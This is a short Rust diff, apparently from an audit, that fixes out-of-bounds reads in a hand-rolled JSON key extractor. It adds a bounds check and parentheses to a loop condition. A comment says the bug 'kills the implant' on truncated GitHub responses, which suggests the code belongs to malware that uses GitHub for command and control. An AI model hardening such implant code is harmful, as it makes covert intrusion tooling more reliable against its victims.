@@ -119,8 +119,21 @@ fn json_extract_str(json: &[u8], key: &[u8], out: &mut [u8]) -> bool {
             while i < json.len() && json[i] != b':' {
                 i += 1;
             }
-            i += 1;
-            while i < json.len() && json[i] == b' ' || json[i] == b'"' {
+            // CRITICAL-20 (2026-07-21 audit): two bugs here.
+            //   (a) `i += 1` unconditionally advanced past `:` even if the
+            //       `while` above ran off the end (truncated JSON). Bounds-check
+            //       first and bail — otherwise the next `json[i]` is OOB.
+            //   (b) `i < json.len() && json[i] == b' ' || json[i] == b'"'` —
+            //       `&&` binds tighter than `||`, so the right operand
+            //       `json[i] == b'"'` evaluated even when `i >= json.len()`,
+            //       also OOB. Under panic=abort this kills the implant on any
+            //       truncated GitHub response (network blip, 401/403 body).
+            //       Add parentheses so the bounds check actually gates both.
+            if i >= json.len() {
+                return false;
+            }
+            i += 1; // skip the ':'
+            while i < json.len() && (json[i] == b' ' || json[i] == b'"') {
                 i += 1;
             }
             let mut o = 0usize;
